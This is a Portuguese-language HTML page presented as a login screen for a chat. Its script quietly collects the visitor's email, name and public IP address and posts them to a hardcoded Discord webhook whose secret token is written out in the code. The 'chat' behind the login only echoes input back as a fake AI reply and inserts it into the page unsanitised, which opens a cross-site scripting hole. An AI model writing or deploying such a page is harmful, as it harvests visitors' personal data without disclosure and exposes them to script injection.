<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login e Chat</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 600px;
        }
        .container h2 {
            margin-bottom: 20px;
        }
        .container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .container button {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background-color: #007bff;
            color: #fff;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #0056b3;
        }
        .error {
            color: red;
            margin-top: 10px;
        }
        .success {
            color: green;
            margin-top: 20px;
        }
        .chat-container {
            display: none;
            flex-direction: column;
            height: 90%;
        }
        .chat-header {
            background-color: #007bff;
            color: #fff;
            padding: 10px;
            border-radius: 8px 8px 0 0;
            text-align: center;
        }
        .chat-body {
            flex-grow: 1;
            overflow-y: auto;
            padding: 10px;
            border-bottom: 1px solid #ccc;
        }
        .chat-message {
            margin-bottom: 10px;
        }
        .chat-message.user {
            text-align: right;
        }
        .chat-input {
            display: flex;
            padding: 10px;
        }
        .chat-input input {
            flex-grow: 1;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px 0 0 4px;
        }
        .chat-input button {
            padding: 10px;
            border: none;
            border-radius: 0 4px 4px 0;
            background-color: #007bff;
            color: #fff;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container" id="loginContainer">
        <h2>Faça Login</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="EMAIL" required>
            <input type="text" id="nome" placeholder="NOME" required>
            <button type="submit">Entrar</button>
        </form>
        <a href="https://discord.gg/Ur7TNEDAru" target="_blank">Entrar no Servidor do Discord</a>
        <p>Link do Discord:</p>
        <p id="discordLink">https://discord.gg/Ur7TNEDAru</p>
        <div id="message" class="error"></div>
    </div>

    <div class="chat-container" id="chatContainer">
        <div class="chat-header">
            <h2>Chat</h2>
        </div>
        <div class="chat-body" id="chatBody">
            <!-- Mensagens do chat serão exibidas aqui -->
        </div>
        <div class="chat-input">
            <input type="text" id="chatInput" placeholder="Digite sua mensagem...">
            <button onclick="sendMessage()">Enviar</button>
        </div>
    </div>

    <script>
        function getUserIP(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(error => console.error('Erro ao obter o IP:', error));
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const nome = document.getElementById('nome').value;

            // Validação de email Gmail
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailPattern.test(email) || !email.endsWith('@gmail.com')) {
                document.getElementById('message').innerText = 'ERROU MDS !';
                return;
            }

            // Obter o IP do usuário
            getUserIP(function(ip) {
                // Enviar dados para o webhook
                fetch('https://discord.com/api/webhooks/1488380749328683099/NGbtn3xlB0YyuL29nv0NS9m4OJihu6CCYFAHtZoghBknsVMZXXxO87_Ok1bmnhkRYz9w', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Novo usuário cadastrado!\nEmail: ${email}\nNome: ${nome}\nIP: ${ip}`
                    })
                }).then(response => response.json())
                  .then(data => {
                      console.log('Sucesso:', data);
                      document.getElementById('message').innerText = 'Você não pode criar exploits para nenhum jogo e não pode falar xingamentos.';
                      document.getElementById('message').className = 'success';
                      // Exibir a mensagem de boas-vindas no chat
                      document.getElementById('chatBody').innerHTML = `<div class="chat-message user">Olá, ${nome}! Bem-vindo ao chat.</div>`;

                      // Mostrar o container de chat e ocultar o container de login
                      document.getElementById('loginContainer').style.display = 'none';
                      document.getElementById('chatContainer').style.display = 'flex';
                  })
                  .catch((error) => {
                      console.error('Erro:', error);
                      document.getElementById('message').innerText = 'ERROU MDS !';
                  });
            });
        });

        function sendMessage() {
            const message = document.getElementById('chatInput').value;
            if (message.trim() === '') return;

            // Exibir a mensagem do usuário
            document.getElementById('chatBody').innerHTML += `<div class="chat-message user">${message}</div>`;

             // Simular resposta da IA
             setTimeout(() => {
                 const response = `Você disse: ${message}`;
                 document.getElementById('chatBody').innerHTML += `<div class="chat-message ia">${response}</div>`;

                 // Limpar o campo de entrada
                 document.getElementById('chatInput').value = '';
                 // Rolar para baixo
                 document.getElementById('chatBody').scrollTop = document.getElementById('chatBody').scrollHeight;

             },50);

             // Limpar o campo de entrada
             document.getElementById('chatInput').value = '';
             // Rolar para baixo
             document.getElementById('chatBody').scrollTop = document.getElementById('chatBody').scrollHeight;

         }

         // Rolar para baixo inicialmente
         document.getElementById('chatBody').scrollTop = document.getElementById('chatBody').scrollHeight;

    </script>
</body>
</html>
